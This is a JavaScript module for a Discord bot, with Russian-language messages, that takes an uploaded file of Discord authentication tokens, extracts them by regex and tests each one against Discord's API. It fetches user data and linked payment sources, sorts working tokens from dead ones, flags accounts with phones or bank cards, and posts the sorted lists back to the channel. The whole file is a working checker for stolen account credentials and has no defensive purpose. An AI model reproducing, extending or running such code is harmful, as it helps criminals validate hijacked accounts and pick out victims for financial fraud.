'use strict';

const fs = require('fs');
const axios = require('axios');
const { MessageEmbed } = require('discord.js');

const getPaymentSources = require('../helpers/getPaymentSources');
const getUserData = require('../helpers/getUserData');

module.exports = async message => {
  const msg = await message.channel.send(generateLoadingEmbed('Скачивание файла'));
  try {
    const attachment = message.attachments.first();
    console.log(attachment);

    const { data: tokens } = await axios.get(attachment.url);
    if (!tokens) throw new Error('Не удалось скачать файл');

    msg.edit(generateLoadingEmbed('Обработка полученного файла'));

    const parsedTokens = tokens
      .split('\n')
      .filter(i => /[MNO][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/.test(i) || i.startsWith('mfa.'));

    if (!parsedTokens.length) throw new Error('Не удалось найти ни одного токена');

    const good = [];
    const bad = [];
    const hasPhone = [];
    const hasCards = [];

    const statusMessage = (firstMessage = '') =>
      [
        firstMessage
          ? firstMessage
          : `Парсинг токенов окончен: ${parsedTokens.length} успешно, в ${
              tokens.split('\n').length - parsedTokens.length
            } ошибка`,
        `${firstMessage ? 'Токены отсортированы' : 'Идет сортировка токенов'} [${good.length + bad.length}/${
          parsedTokens.length
        }] | Хорошие: ${good.length} | Плохие: ${bad.length}`,
        `Из них имеют телефон: ${hasPhone.length}`,
        `Из них имеют привязанную карту: ${hasCards.length}`,
      ].join('\n');

    msg.edit(generateLoadingEmbed(statusMessage()));

    for await (const token of parsedTokens) {
      try {
        const userData = await getUserData(token);
        const paymentSources = await getPaymentSources(token);

        good.push(token);
        if (userData.phone) hasPhone.push(token);
        if (paymentSources.length > 0) hasCards.push(`${token}|Карт: ${paymentSources.length}`);
      } catch (error) {
        bad.push(token);
      }

      if ((bad.length + good.length) % 10 === 0) {
        msg.edit(generateLoadingEmbed(statusMessage()));
      }
    }

    msg.edit(generateLoadingEmbed(statusMessage('Сохранение данных в файлы')));

    const id = Date.now();
    saveFile(id, 'good.txt', good.join('\n'));
    saveFile(id, 'bad.txt', bad.join('\n'));
    saveFile(id, 'hasPhone.txt', hasPhone.join('\n'));
    saveFile(id, 'hasCards.txt', hasCards.join('\n'));

    msg.delete();

    message.reply(
      new MessageEmbed()
        .setColor('GREEN')
        .setTitle('Успех')
        .setDescription(statusMessage('Успешно отсортировано. Отправка результатов в новом сообщении')),
    );

    const fileNames = ['bad.txt', 'good.txt', 'hasCards.txt', 'hasPhone.txt'];
    message.channel.send({ files: fileNames.map(i => ({ attachment: `temp/${id}/${i}`, name: i })) });
  } catch (err) {
    console.error(err);
    msg.edit(`Произошла ошибка при обработке: ${err.message}`);
  }
};

function saveFile(id, name, content) {
  const existsTemp = fs.existsSync('temp');
  if (!existsTemp) fs.mkdirSync('temp');

  const existsID = fs.existsSync(`temp/${id}`);
  if (!existsID) fs.mkdirSync(`temp/${id}`);

  fs.writeFileSync(`temp/${id}/${name}`, content);
  return true;
}

function generateLoadingEmbed(status) {
  return new MessageEmbed()
    .setColor('GRAY')
    .setTitle('**Идет обработка...**')
    .setDescription(`Статус: **${status}**`)
    .setColor('ORANGE');
}
